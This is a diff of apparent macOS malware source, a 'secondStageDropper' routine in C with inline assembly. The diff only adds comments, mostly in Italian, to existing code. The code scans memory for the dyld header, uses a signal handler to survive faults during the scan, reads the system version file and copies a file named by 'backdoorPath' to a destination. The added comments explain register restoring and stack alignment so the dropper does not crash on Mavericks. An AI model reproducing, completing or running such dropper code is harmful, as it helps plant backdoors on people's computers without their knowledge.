@@ -1238,6 +1238,7 @@ void secondStageDropper (unsigned long args)
 	unsigned int fd;
 	hijack_context *h_context = (hijack_context *)&args; // "context" saved by pushad
 
+	// save registers to restore it later
 	unsigned long _eax = h_context->eax;
 	unsigned long _ecx = h_context->ecx;
 	unsigned long _edx = h_context->edx;
@@ -1286,7 +1287,7 @@ get_pc:
 sig_handler:
 		mov eax, esp
 sig_loop:
-		add eax, 0x4
+		add eax, 0x4 // eax == eip subito dopo get_pc
 		cmp [eax], ebp
 		jne sig_loop
 
@@ -1350,9 +1351,9 @@ l_out:
 	__asm__ __volatile__ {
 		mov eax, 0x8fe00000
 l_loop:
-		cmp DWORD PTR [eax], 0xfeedface
+		cmp DWORD PTR [eax], 0xfeedface // se qui c'e' un exception va a eseguire il sig_handler qui sopra che restora i registri e ritorna due istruzioni dipo.
 		je found
-		add eax, 0x1000
+		add eax, 0x1000 // qui ritorna il sig_handler!
 		cmp eax, 0x8fff1000
 		jne l_loop
 		mov DWORD PTR [dyldBaseAddress], 0x0
@@ -1364,7 +1365,7 @@ l_break:
 	}
 
 	char SystemVersion[49] = {'/', 'S', 'y', 's', 't', 'e', 'm', '/', 'L', 'i', 'b', 'r', 'a', 'r', 'y', '/', 'C', 'o', 'r', 'e', 'S', 'e', 'r', 'v', 'i', 'c', 'e', 's', '/', 'S', 'y', 's', 't', 'e', 'm', 'V', 'e', 'r', 's', 'i', 'o', 'n', '.', 'p', 'l', 'i', 's', 't', 0x0};
-	// find macosx version
+	// find macosx version, si puo' fare con una syscall :)
 	__asm__ __volatile__ {
 		push 0
 		///push [SystemVersion]
@@ -1690,8 +1691,8 @@ l_break:
 			{
 				__asm 
 				{
-					push 1 /* fuck SIMD :| */
-					push 1 /* fuck SIMD :| */
+					push 1 /* fuck SIMD :|, su mavericks la sprintf fa uso di istruzioni SSE che richiedono stack allineato a 16 byte*/
+					push 1 /* fuck SIMD :| quindi nel caso crashase sulla sprintf misteriosamente si puo' aggiungere o togliere uno o piu' push push */
 					push 1 /* fuck SIMD :| */
 					push cin
 					push qua
@@ -1739,7 +1740,7 @@ l_break:
 					{
 						__asm
 						{
-							push 1
+							push 1 // questa push e' per allineare lo stack a 16 byte come sopra (per mavericks)
 							push 256
 							push destinationPath
 							push backdoorPath
